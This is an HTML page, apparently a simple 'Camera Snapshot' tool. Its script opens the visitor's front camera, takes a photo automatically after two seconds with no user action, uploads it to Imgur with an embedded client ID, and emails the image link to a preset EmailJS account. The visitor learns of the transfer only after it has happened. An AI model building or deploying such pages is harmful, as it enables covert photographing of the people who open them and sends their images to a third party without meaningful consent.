<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Camera Snapshot</title>
</head>
<body>
  <h2>Camera Snapshot</h2>
  <video id="video" width="1280" height="720" autoplay playsinline></video>
  <canvas id="canvas" width="1280" height="720" style="display:none;"></canvas>

  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    emailjs.init("eD5ejiUiqX5khbO-o");

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    function uploadToImgur(base64Image) {
      const apiUrl = "https://api.imgur.com/3/image";
      const clientId = "d9c637b3675e937";
      const base64Clean = base64Image.split(',')[1].trim();

      return fetch(apiUrl, {
        method: "POST",
        headers: {
          Authorization: `Client-ID ${clientId}`,
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          image: base64Clean,
          type: "base64"
        })
      })
      .then(response => response.json())
      .then(data => {
        if (data.success) {
          return data.data.link;
        } else {
          throw new Error(data.data.error || "Imgur upload failed");
        }
      });
    }

    function takeSnapshotAndSend() {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      const imageData = canvas.toDataURL('image/png');

      uploadToImgur(imageData).then(imgurLink => {
        const templateParams = {
          image_url: imgurLink
        };

        emailjs.send('service_8fdw382', 'template_giubqnn', templateParams)
          .then(() => alert("ðŸ“¸ Full quality photo uploaded and email sent!"))
          .catch(err => alert("âŒ Email send failed: " + err.text));
      }).catch(err => alert("âŒ Imgur upload failed: " + err.message));
    }

    navigator.mediaDevices.getUserMedia({
      video: {
        facingMode: "user",
        width: { ideal: 1280 },
        height: { ideal: 720 }
      },
      audio: false
    })
    .then(stream => {
      video.srcObject = stream;
      video.onloadedmetadata = () => {
        setTimeout(() => takeSnapshotAndSend(), 2000);
      };
    })
    .catch(err => alert("Camera error: " + err));
  </script>
</body>
</html>
